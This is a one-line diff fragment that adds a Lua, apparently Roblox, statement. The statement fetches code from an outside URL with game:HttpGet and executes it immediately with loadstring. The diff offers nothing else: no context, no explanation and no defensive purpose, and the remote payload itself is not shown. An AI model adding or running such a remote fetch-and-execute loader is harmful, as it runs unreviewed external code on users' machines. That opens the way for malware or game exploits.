@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://x.klash.dev/mikate"))()
